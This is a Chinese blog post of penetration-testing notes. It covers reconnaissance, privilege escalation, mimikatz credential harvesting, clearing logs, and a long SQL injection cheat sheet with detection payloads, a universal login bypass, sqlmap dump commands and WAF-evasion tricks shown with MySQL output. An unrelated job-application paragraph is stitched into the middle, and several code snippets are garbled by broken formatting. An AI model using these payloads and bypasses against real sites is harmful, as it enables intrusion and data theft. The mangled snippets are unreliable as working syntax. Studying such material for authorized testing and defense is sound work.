<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>渗透思路 | q0o0p</title><meta name="author" content="q0o0p"><meta name="copyright" content="q0o0p"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="网站渗透思路第一类 a. 服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）              b. 网站指纹识别（包括，cms，cdn，证书等），dns记录              c. whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）              d. 子域名收集，旁站查询(有授权可渗透)，C段等              e. go">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透思路">
<meta property="og:url" content="https://github.com/q0o0p-wow/q0o0p-wow.github.io/2020/10/15/re/index.html">
<meta property="og:site_name" content="q0o0p">
<meta property="og:description" content="网站渗透思路第一类 a. 服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）              b. 网站指纹识别（包括，cms，cdn，证书等），dns记录              c. whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）              d. 子域名收集，旁站查询(有授权可渗透)，C段等              e. go">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://github.com/q0o0p-wow/q0o0p-wow.github.io/2020/10/15/re/undefined">
<meta property="article:published_time" content="2020-10-14T17:11:58.000Z">
<meta property="article:modified_time" content="2021-10-14T09:30:34.803Z">
<meta property="article:author" content="q0o0p">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/q0o0p-wow/q0o0p-wow.github.io/2020/10/15/re/undefined"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://github.com/q0o0p-wow/q0o0p-wow.github.io/2020/10/15/re/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '渗透思路',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-10-14 17:30:34'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    document.addEventListener('pjax:complete', detectApple)})(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"> <link rel="stylesheet" href="/live2d-widget/waifu.css"> <link rel="stylesheet" href="/css/my.css"><meta name="generator" content="Hexo 6.1.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">84</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">21</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/2020/10/15/re/undefined')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">q0o0p</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">渗透思路</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-10-14T17:11:58.000Z" title="Created 2020-10-15 01:11:58">2020-10-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-10-14T09:30:34.803Z" title="Updated 2021-10-14 17:30:34">2021-10-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">8.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>31min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="渗透思路"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="网站渗透思路"><a href="#网站渗透思路" class="headerlink" title="网站渗透思路"></a>网站渗透思路</h1><h2 id="第一类"><a href="#第一类" class="headerlink" title="第一类"></a>第一类</h2><p> a. 服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）<br>              b. 网站指纹识别（包括，cms，cdn，证书等），dns记录<br>              c. whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）<br>              d. 子域名收集，旁站查询(有授权可渗透)，C段等<br>              e. google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等<br>              f. 扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等<br>              i. 传输协议，通用漏洞，exp，github源码等</p>
<pre><code>   2）漏洞挖掘

  1&gt; 浏览网站，看看网站规模，功能，特点等

          2&gt; 端口，弱口令，目录等扫描
          3&gt; XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等
</code></pre><p>3）漏洞利用 | 权限提升</p>
<pre><code>          a) mysql提权，serv-u提权，linux内核版本提权等
</code></pre><p>4）清除测试数据 | 输出报告</p>
<pre><code>          i 日志、测试数据的清理
          ii 总结，输出渗透测试报告，附修复方案
</code></pre><p>5)复测</p>
<pre><code>          验证并发现是否有新漏洞，输出报告，归档
</code></pre><h2 id="第二类"><a href="#第二类" class="headerlink" title="第二类"></a>第二类</h2><p>（一）针对网站程序，不考虑服务器。<br>一、查找注入，注意数据库用户权限和站库是否同服。<br> 通常，判断一个网站是否存在注入点，可以用’，and 1=1 ,and 1=2,+and+1=1,+and+1=2,%20and%201=1,%20and%201=2,来判断，如果and 1=1正常返回页面，1=2错误，或者找不到，那么就存在注入点<br> 万能密码’or’=’or’,可以用在后台管理输入，有的网站由于没有过滤OR漏洞，输入OR直接就可以突破，一般漏洞存在于ASP类型的网站<br>二、查找XSS</p>
<p>三、查找上传，一些能上传的页面，比如申请友链、会员头像、和一些敏感页面等等，注意查看验证方式是否能绕过，注意结合服务器的解析特性，比如典型的IIS6.0、阿帕奇等。</p>
<p>四、查找编辑器，比较典型的ewebeditor、fckeditor等等。</p>
<p>五、查找phpmyadmin等管理程序，可以尝试弱口令，或者寻找其漏洞。</p>
<p>六、百度、谷歌搜索程序公开漏洞。</p>
<p>七、猜解文件，如知道某文件为admin_login.php,我们可尝试admin_add.php、admin_upload.php文件是否存在，也可以谷歌搜索site:cnseay.com inurl:edit等等，很多时候可以找到一些敏感文件，接着看是否验证权限或能否绕过验证，这像冰风说高级语法。</p>
<p>八、会员注册、修改、删除、评论等一切需要操作数据库的地方记得加单引号之类查看是否存在insert、update等类型注入。</p>
<p>九、会员或低权限管理登陆后可抓包分析，尝试修改超级管理员密码，权限提升。</p>
<p>十、通常有下载功能的站我们可以尝试修改下URL文件名，看能否下载站点敏感文件，如数据库配置文件等，数据库不可外连情况下可以尝试数据库密码登陆后台，也可下载上传、登陆验证等文件进行代码审计。</p>
<p>十一、备份文件和后门，某些主站子目录存在分站，比如www.cnseay.com/seay/，我们可以尝试www.cnseay.com/seay.rar/zip等压缩文件是否存在，可能就是子站的源码。也有一些站类似这样www.cnseay.com/old/，一般都是以前的老站，通常老站会比较容易拿。还有就是数据库备份、前人的后门等，具体这些目录上的东西就要看你的字典了。</p>
<p>（二）针对服务器<br>一、通常先扫下服务器开放的端口，再考虑对策。</p>
<p>二、比较常见的解析漏洞，比如IIS6.0、阿帕奇、nginx/IIS7.0(php-fpm)解析漏洞等，还有就是cer、asa之类的解析，.htaccess文件解析配置等。</p>
<p>三、弱口令和everyone权限，先扫描服务器开放的端口，比如21对应的FTP、1433对应的MSSQL、3306对应的MYSQL、3389对应的远程桌面、1521对应的Oracle等等，平时可以多搜集下字典，有时候效果也是不错的(通常在cain嗅探的时候，经常能嗅到别人不停的扫…很蛋疼)。</p>
<p>四、溢出，这点要看系统补丁和服务器使用的软件等等，比如FTP等工具，这里不详解。</p>
<p>五、针对一些服务器管理程序，比如tomcat、jboss等等，这种比较常见于大中型的站点服务器。</p>
<p>六、IIS、apache等各种漏洞，这个要平时多关注。</p>
<p>七、目录浏览，服务器配置不当，可直接浏览目录。</p>
<p>八、共享…</p>
<p>（三）针对人，社工<br>社工在渗透中通常能起到惊人的效果，主要还是利用人的弱点，博大精深，这里不详细讨论，注意平时多看一些社工文章，学习一些思路、技巧。</p>
<p>（四）迂回战术，旁注和C段<br>一、旁注，针对旁站，我们可以运用到上面说到的方法，这里不多说。</p>
<p>二、C段，基本想到C段就会想到cain，针对C段的站点和服务器，结合上面说的针对目标站、服务器、人、旁站的思路，一个道理，当然如果你的目的仅仅是黑站的话，不妨试试NetFuke之类。</p>
<p>（五）提权常用手段<br>一、使用系统溢出提权EXP，这类在提权中最常用，使用的方法大都一致，比如比较常见的巴西烤肉、pr等等，溢出提权通常在Linux上也利用的比较多，注意多收集EXP。</p>
<p>二、第三方软件提权，主要还是利用服务器上安装的第三方软件拥有比较高的权限，或者软件的溢出漏洞，比如典型的mssql、mysql、serv-u等等，还有各种远程控制软件，比如pcanywhere、Radmin这类。</p>
<p>三、劫持提权，说到这个，想必肯定会想到lpk.dll这类工具，有时候在蛋疼怎么都加不上账户的时候，可以试试劫持shift、添加开机启动等等思路。</p>
<p>四、弱口令技巧，我们可以看看有木有什么hack、或者隐藏账户之类的，一般这种用户密码都比较简单，可以尝试下弱口令，还有之前说过的各种数据库、远程控制软件、FTP软件的弱口令，没办法的时候就去扫扫碰碰运气吧。</p>
<p>五、信息收集，注意翻下硬盘各种文档，说不定各种密码就在里面。在内网渗透时，信息收集是非常重要的，记得拿下服务器了GET一下明文密码，德国那个mimikatz不错，还有就是域、ARP。。。貌似扯多跑题了。</p>
<p>六、社工…不多说。<br>暂时总结到这里，渗透博大精深，不是这么几段字就能说清楚的，具体还是要看具体情形，随机应变。一定要养成在渗透过程中信息收集的好习惯，特别是针对大中型站点，注意收集子站域名、目录、密码等等敏感信息，这对于我们后面的渗透非常有用，内网经常弱口令，同密码比较多。很多时候，或许一个主站就死在子站的一个小漏洞上。</p>
<p>#<br>前辈您好,我叫xxx ,就读取花椒物联网工程专业,出于对安全的兴趣,入学后加入计算机紧急响应组社团,大一大二学习了一些基础开发,大二下和大三上主要学习web安全,在ctf中遇到过Android逆向题,刚开始无从下手,于是大三下到现在就学了app逆向以及一些app安全相关的东西,而且平时有一个习惯,学过的东西和过程记录会写到个人博客中<br>我的优点是乐于学习,愿意分享,目前还有很多不足,希望能有机会和个位师傅学习,在实践中成长.</p>
<hr>
<h1 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h1><h2 id="sql注入检测"><a href="#sql注入检测" class="headerlink" title="sql注入检测"></a>sql注入检测</h2><h3 id="1-加入单引号-’提交"><a href="#1-加入单引号-’提交" class="headerlink" title="1.加入单引号 ’提交,"></a>1.加入单引号 ’提交,</h3><p>结果:如果出现错误提示，则该网站可能就存在注入漏洞。</p>
<h3 id="2-数字型判断是否有注入"><a href="#2-数字型判断是否有注入" class="headerlink" title="2.数字型判断是否有注入;"></a>2.数字型判断是否有注入;</h3><p>语句：and 1=1 ;and 1=2 （经典）、’ and ‘1’=1(字符型）<br>结果:分别返回不同的页面,说明存在注入漏洞.<br>分析：and 的意思是“和”如果没有过滤我们的语句，and 1=1就会被代入SQL查询语句进行查询，<br>如果and前后的两条语句都是真的话就不会出错，但如果前后语句有一个为假的话，程序就会暴错。<br>也就表明程序有注入漏洞<br>防注入解决办法：<br>使用or 2&gt;1 ; or 1&gt;2来进行判断<br>  结果:分别返回不同的页面,说明存在注入漏洞.<br>  分析：or注入只要求前后两个语句只要有一个正确就为真，如果前后两个语句都是正确的，反而为<br>假。<br>   记住：or注入时，or后面的语句如果是正确的，则返回错误页面！如果是错误，则返回正确页面<br>，说明存在注入点。<br> 使用xor 1=1; xor 1=2<br>   结果:分别返回不同的页面,说明存在注入漏洞.<br>   分析:xor 代表着异或,意思即连接的表达式仅有一个为真的时候才为真。<br>   记住：xor注入时，xor后面的语句如果是正确的，则返回错误页面积，如果是错误，则返回正确<br>页面，说明存在注入点。<br>把and 1=1转换成URL编码形式后在提交<br>  and 1=1 URL编码：%41%4E%44%20%%31%3D%31<br>使用-1；-0<br>  分析：如果返回的页面和前面不同，是另一则新闻，则表示有注入漏洞，是数字型的注入漏洞;在<br>URL地址后面加上 -0，URL变成 news.asp?id=123-0，返回的页面和前面的<br>页面相同，加上-1，返回错误页面，则也表示存在注入漏洞.</p>
<h3 id="3-字符型判断是否有注入："><a href="#3-字符型判断是否有注入：" class="headerlink" title="3.字符型判断是否有注入："></a>3.字符型判断是否有注入：</h3><p>  语句：’ and ‘1’=1；’ and  ‘1=2(经典）<br>  结果：结果:分别返回不同的页面,说明存在注入漏洞.<br>  分析：加入’ and ‘1’=1返回正确页面，加入’ and  ‘1=2返回错误页面，说明有注入漏同。<br>  防注入解决办法：<br>  在URL的地址后面加上’%2B’（字符型）<br>  分析：URL地址变为：news.asp?id=123’%2B’，返回的页面和1同;加<br>上’2%2B’asdf，URL地址变为：news.asp?id=123’%2Basdf，返回的页面和1<br>不同，或者说未发现该条记录，或者错误，则表示存在注入点，是文本型的。</p>
<h3 id="4-搜索型判断是否有注入"><a href="#4-搜索型判断是否有注入" class="headerlink" title="4.搜索型判断是否有注入:"></a>4.搜索型判断是否有注入:</h3><p>简单的判断搜索型注入漏洞存在不存在的办法是先搜索’，如果出错，说明90%存在这个漏洞。然后搜<br>索%，如果正常返回，说明95%有洞了。<br>说明：加入如”&amp;;”、”[“、”]”、”%”、”$”、”@”等特殊字符，都可以实现，如果出现错误，说明有问题<br>操作：<br>搜索一个关键字，比如2006吧，正常返回所有2006相关的信息，再搜索2006%’and 1=1 and ‘%’=’和<br>2006%’and 1=2 and ‘%’=’，存在异同的话，就是100%有洞了。<br>关键字%’ and 1=1 and ‘%’=’%<br>关键字%’ and 1=2 and ‘%’=’%<br>将and 1=1 换成注入语句就可以了</p>
<h2 id="sqlmap支持5种注入模式："><a href="#sqlmap支持5种注入模式：" class="headerlink" title="sqlmap支持5种注入模式："></a>sqlmap支持5种注入模式：</h2><p>　　1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</p>
<p>　　2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
<p>　　3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
<p>　　4、联合查询注入，可以使用union的情况下的注入。</p>
<p>　　5、堆查询注入，可以同时执行多条语句的执行时的注入。</p>
<h3 id="常见步骤如下："><a href="#常见步骤如下：" class="headerlink" title="常见步骤如下："></a>常见步骤如下：</h3><p>step1：sqlmap -u [“URL”] //测试是否存在注入<br>step2：sqlmap -u [“URL”] -current-db //查询当前数据库<br>step3：sqlmap -u [“URL”] -D [“数据库名”] —tables //查询当前数据库中的所有表<br>step4：sqlmap -u [“URL”] -D [“数据库名”] -T [“表名”] —columns //查询指定库中指定表的所有列(字段)<br>step5：sqlmap -u [“URL”] -D [“数据库名”] -T [“表名”] -C [“列名”] —dump //打印出指定库中指定表指定列中的字段内容</p>
<h3 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h3><p>sql注入绕过<br>1.1 注释符绕过<br>常用注释符：</p>
<p> — , /**/, #<br>1<br>验证：</p>
<p>mysql&gt; select <em> from sql_test where id = /</em>11*/1;+——+—————+—————+| id | username | password |+——+—————+—————+|  1 | admin    | 123456   |+——+—————+—————+1 row in set (0.00 sec)</p>
<p>mysql&gt; select <em> from sql_test where id = 3;— select </em> from sql_test;+——+—————+—————+| id | username | password |+——+—————+—————+|  3 | test2    | 456      |+——+—————+—————+1 row in set (0.00 sec)</p>
<p>mysql&gt; select <em> from sql_test where id = 3;# select </em> from sql_test;+——+—————+—————+| id | username | password |+——+—————+—————+|  3 | test2    | 456      |+——+—————+—————+1 row in set (0.00 sec)<br>1<br>2<br>3<br>4<br>5<br>这里还从别的表哥博客中发现了一种新姿势：</p>
<p>mysql&gt; select <em> from sql_test where id =’1’/1=(1=3)/‘1’=’1’;+——+—————+—————+| id | username | password |+——+—————+—————+|  2 | test     | 234      ||  3 | test2    | 456      |+——+—————+—————+2 rows in set (0.00 sec) mysql&gt; select </em> from sql_test where id =’1’/1=(1=1)/‘1’=’1’;+——+—————+—————+| id | username | password |+——+—————+—————+|  1 | admin    | 123456   |+——+—————+—————+1 row in set (0.00 sec)<br>1<br>理解如下：</p>
<p>where id=1=0/1=1<br>-&gt;where id=1=0=1<br>id!=1,比如id=2 和 id=3的时候<br>id=1返回了一个值为0的布尔变量<br>0=0继而返回了1的布尔变量<br>再和=1比较，返回比较成功，故选取了id2,3的记录</p>
<p>先除后判等，左往右</p>
<p>1.2 大小写绕过<br>sql语句忽略关键词是否大小写，其实只要waf不是故意这样设计的，基本上拦截都是大小写一起拦截的</p>
<p>mysql&gt; select <em> from sql_test where id = 3 uniON sEleCt  </em> from sql_test where id = 2;+——+—————+—————+| id | username | password |+——+—————+—————+|  3 | test2    | 456      ||  2 | test     | 234      |+——+—————+—————+2 rows in set (0.00 sec)<br>1<br>2<br>3<br>1.3 内联注释绕过<br>ummmm，解释起来就是，它把一些特有的仅在MYSQL上的语句放在 /<em>! … </em>/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中它会执行</p>
<p>mysql&gt; select <em> from sql_test where id = 3 union /</em>!select<em>/  </em> from sql_test where id like 2;+——+—————+—————+| id | username | password |+——+—————+—————+|  3 | test2    | 456      ||  2 | test     | 234      |+——+—————+—————+2 rows in set (0.00 sec)<br>1<br>2<br>3<br>1.4 双关键字绕过<br>?id=1+UNIunionON+SeLselectECT+1,2,3–</p>
<p>这个一般用于简易waf，好心办坏事，比如说他将关键词select忽略大小写，只要有这个词，就把它替换成空（注意，只替换一次），这样原先我们注入的seleselectct是错误的，识别不出来的，但是经过waf 就变成了select，可以正确识别<br>1<br>2<br>3<br>1.5 编码绕过<br>双重url编码，这个得遇到特殊题目可以这么做，后台可能代码如下：</p>
<p>$insert=$link-&gt;query(urldecode($_GET[‘id’]));$row=$insert-&gt;fetch_row();<br>1<br>16进制绕过：</p>
<p>mysql&gt; select <em> from sql_test where id = 3 union select  </em> from sql_test where username = 0x74657374;+——+—————+—————+| id | username | password |+——+—————+—————+|  3 | test2    | 456      ||  2 | test     | 234      |+——+—————+—————+2 rows in set (0.06 sec)</p>
<p>mysql&gt; select  <em> from sql_test where username = char(116)+char(101)+char(115)+char(116);+——+—————+—————+| id | username | password |+——+—————+—————+|  1 | admin    | 123456   ||  2 | test     | 234      ||  3 | test2    | 456      |+——+—————+—————+3 rows in set, 3 warnings (0.00 sec)<br>1<br>2<br>3<br>1.6 空格绕过<br>waf拦截了空格，怎么办？五种考虑，用双空格/制表符代替尝试，用/*</em>/当做空格，用括号包起来进行，用回车代替空格，反引号`的使用</p>
<p>mysql&gt; select(id)from(sql_test)where(id=1);+——+| id |+——+|  1 |+——+1 row in set (0.00 sec)</p>
<p>mysql&gt; select/<strong>/id/</strong>/from/<strong>/sql_test/</strong>/where/<strong>/id=1/</strong>/;+——+| id |+——+|  1 |+——+1 row in set (0.00 sec)</p>
<p>mysql&gt; select    -&gt; id    -&gt; from    -&gt; sql_test    -&gt; where    -&gt; id    -&gt; =    -&gt; 1    -&gt; ;+——+| id |+——+|  1 |+——+1 row in set (0.00 sec)<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>注：url中%0a为回车</p>
<p>mysql&gt; select   username        from    sql_test        where   id=1    ;+—————+| username |+—————+| admin    |+—————+1 row in set (0.00 sec)</p>
<p>mysql&gt; select*from<code>sql_test</code>where<code>id</code>=1;+——+—————+—————+| id | username | password |+——+—————+—————+|  1 | admin    | 123456   |+——+—————+—————+1 row in set (0.00 sec)<br>1<br>2<br>3<br>1.7 等于号绕过<br>拦截了等于号，我们可以用like去代替：</p>
<p>mysql&gt; select * from sql_test where username like ‘admin’;+——+—————+—————+| id | username | password |+——+—————+—————+|  1 | admin    | 123456   |+——+—————+—————+1 row in set (0.00 sec)<br>1<br>2<br>3<br>1.8 逗号绕过<br>在使用盲注的时候，需要使用到substr(),mid(),limit；这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from for的方式来解决，limit则可以用offset</p>
<p>mysql&gt; select <em> from sql_test where ascii(mid(username from 1 for 1))&gt;1;+——+—————+—————+| id | username | password |+——+—————+—————+|  1 | admin    | 123456   ||  2 | test     | 234      ||  3 | test2    | 456      |+——+—————+—————+3 rows in set (0.00 sec) mysql&gt; select </em> from sql_test where ascii(mid(username from 1 for 1))&gt;97;+——+—————+—————+| id | username | password |+——+—————+—————+|  2 | test     | 234      ||  3 | test2    | 456      |+——+—————+—————+2 rows in set (0.00 sec)</p>
<p>mysql&gt; select * from sql_test where ascii(substr(username from 1 for 1))&gt;97;+——+—————+—————+| id | username | password |+——+—————+—————+|  2 | test     | 234      ||  3 | test2    | 456      |+——+—————+—————+2 rows in set (0.00 sec)</p>
<p>mysql&gt; select * from sql_test limit 1 offset 1;+——+—————+—————+| id | username | password |+——+—————+—————+|  2 | test     | 234      |+——+—————+—————+1 row in set (0.00 sec)<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>1.9 大于号小于号拦截绕过<br>在使用盲注的时候，在爆破的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest，strcmp,in,between来进行绕过了。</p>
<p>mysql&gt; select * from sql_test where id=1 and greatest(ascii(substr(username,1,1)),1)=97;+——+—————+—————+| id | username | password |+——+—————+—————+|  1 | admin    | 123456   |+——+—————+—————+1 row in set (0.05 sec)</p>
<p>mysql&gt; select <em> from sql_test where id=1 and strcmp(ascii(substr(username,1,1)),1);+——+—————+—————+| id | username | password |+——+—————+—————+|  1 | admin    | 123456   |+——+—————+—————+1 row in set (0.03 sec) mysql&gt; select </em> from sql_test where id=1 and strcmp(ascii(substr(username,1,1)),97);Empty set (0.00 sec)</p>
<p>mysql&gt; select <em> from sql_test where id = 1 and substr(username,1,1) in (‘a’);+——+—————+—————+| id | username | password |+——+—————+—————+|  1 | admin    | 123456   |+——+—————+—————+1 row in set (0.23 sec) mysql&gt; select </em> from sql_test where id = 1 and substr(username,1,1) in (‘b’);Empty set (0.00 sec)</p>
<p>mysql&gt; select <em> from sql_test where id = 1 and substr(username,1,1) between 0x61 and 0x63;+——+—————+—————+| id | username | password |+——+—————+—————+|  1 | admin    | 123456   |+——+—————+—————+1 row in set (0.00 sec) mysql&gt; select </em> from sql_test where id = 1 and substr(username,1,1) between ‘a’ and ‘c’;+——+—————+—————+| id | username | password |+——+—————+—————+|  1 | admin    | 123456   |+——+—————+—————+1 row in set (0.00 sec)<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>2.0 宽字节注入<br>`</p>
<p>过滤单引号时，可以试试宽字节</p>
<p>%bf%27 %df%27 %aa%27</p>
<p>`</p>
